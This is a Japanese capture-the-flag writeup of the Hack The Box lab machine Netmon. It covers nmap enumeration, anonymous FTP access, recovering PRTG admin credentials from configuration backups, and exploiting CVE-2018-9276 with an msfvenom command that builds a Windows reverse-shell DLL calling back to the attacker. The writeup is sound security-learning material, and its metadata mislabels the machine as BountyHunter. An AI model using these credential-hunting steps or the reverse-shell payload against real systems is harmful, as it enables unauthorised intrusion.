---
title: 【Easy/Windows】Netmon Writeup(HackTheBox)
date: "2021-11-24"
template: "post"
draft: false
slug: "hackthebox-windows-netmon"
category: "HackTheBox"
tags:
  - "HackTheBox"
  - "Windows"
  - "EasyBox"
description: "HackTheBoxのリタイアマシン「BountyHunter」のWriteUpです。"
socialImage: "/media/cards/no-image.png"
---

「Hack The Box」という、ペネトレーションテストの学習プラットフォームを利用してセキュリティについて学んでいます。
「Hack The Box」のランクは、本記事執筆時点でProHackerです。

<img src="http://www.hackthebox.eu/badge/image/327080" alt="Hack The Box">

今回は、HackTheBoxのリタイアマシン「netmon」のWriteUpです。

![image-10.png](../../static/media/2021-11-24-hackthebox-windows-netmon/image-10.png)

### 記事について

**本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。**

自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。

またすべての発言は所属団体ではなく個人に帰属します。

<!-- omit in toc -->
## もくじ
- [探索](#探索)
- [FTPログイン](#ftpログイン)
- [リバースシェルの取得](#リバースシェルの取得)
- [認証情報の取得](#認証情報の取得)
- [エクスプロイト](#エクスプロイト)
- [まとめ](#まとめ)

## 探索

とりあえずいつもの通りスキャンを試していきます。

``` bash
sudo sed -i 's/^[0-9].*targethost.htb/10.10.10.152  targethost.htb/g' /etc/hosts
nmap -sV -sC -T4 targethost.htb| tee nmap1.txt
```

出力結果はこんな感じでした。

``` bash
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-23 19:35 JST
Stats: 0:01:55 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 66.94% done; ETC: 19:38 (0:00:57 remaining)
Warning: 10.10.10.152 giving up on port because retransmission cap hit (6).
Nmap scan report for targethost.htb (10.10.10.152)
Host is up (0.68s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE    SERVICE      VERSION
21/tcp  open     ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
80/tcp  open     http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
135/tcp open     msrpc        Microsoft Windows RPC
139/tcp open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open     microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
514/tcp filtered shell
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2021-11-23T10:44:51
|_  start_date: 2021-11-23T04:32:58
|_clock-skew: mean: 6m19s, deviation: 0s, median: 6m18s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.12 seconds
```

FTPのAnonymousログインが有効になっていることがわかります。

## FTPログイン

Anonymousログインを実施したところ、すぐにuserフラグを取得することができました。

``` bash
ftp targethost.htb
# anonymous / パスワードなし

dir Users/Public
lcd ./
cd Users/Public
dir
get user.txt
```

続いてrootフラグの取得のために、リバースシェルの獲得を目指します。

## リバースシェルの取得

nmapの結果から、`Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)`が稼働していることがわかります。

``` bash
80/tcp  open     http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
```

このバージョンの脆弱性について探したところ、`CVE-2018-9276`がヒットしました。

参考：[NVD - CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276)

`CVE-2018-9276`は、OSコマンドインジェクションの脆弱性で、RCEを実行することで管理者権限のシェルが取得できる脆弱性のようです。

これが刺さればrootも取れそうです。

## 認証情報の取得

`CVE-2018-9276`を使うには`Paessler PRTG bandwidth monitor`の認証情報が必要です。

というわけで認証情報を探索していきます。

デフォルトのクレデンシャル情報は`prtgadmin`のようですが、これは使えませんでした。

参考：[What's the login name and password for the PRTG web interface? How do I change it? | Paessler Knowledge Base](https://kb.paessler.com/en/topic/433-what-s-the-login-name-and-password-for-the-prtg-web-interface-how-do-i-change-it)

そこで、AnonymousログインしたFTPで認証情報を含むファイルがないか探索していきます。

大抵の場合、認証情報を探索するときはまず以下のいずれかのファイルをターゲットにしていきます。

- 設定情報が記載されたconfigファイル
- 認証情報が格納されたデータベースのダンプ
- 認証情報が平文で書き込まれているアクセスログ
- 過去の認証情報が記録されたバックアップファイルやシャドウコピー

今回は、`C:\ProgramData\`配下の`Paessler/PRTG Network Monitor`を探索しました。

FTPのdirコマンドでは、`C:\ProgramData\`のような隠しフォルダは一覧されないので注意が必要でした。

この中にある設定ファイルのバックアップを取得したところ、`prtgadmin / PrTg@dmin2018`という認証情報が取得できました。

しかし、この認証情報は残念ながら現在は使用できません。

configファイルの作成日時を見ると、`PrTg@dmin2018`が埋め込まれたバックアップファイルは2018年に作成されたのに対して、現在の設定ファイルは2019年に作成されていました。

そこで、`prtgadmin / PrTg@dmin2019`という認証情報を使用したところ、正常に認証されました。

## エクスプロイト

認証情報が取得できたところで、こちらのエクスプロイトコードを使用してrootを取得したいと思います。

参考：[CVE-2018-9276/exploit.py at main · A1vinSmith/CVE-2018-9276](https://github.com/A1vinSmith/CVE-2018-9276/blob/main/exploit.py)

手元の環境で上手く動作するように、msfvenomによるエクスプロイトモジュールは自分で作成し、エクスプロイトコードも一部改変しました。

``` bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.7 LPORT=4444 -f dll > venom
```

これを実行したところ、無事にrootが取得できました。

## まとめ

非常にシンプルなマシンでした。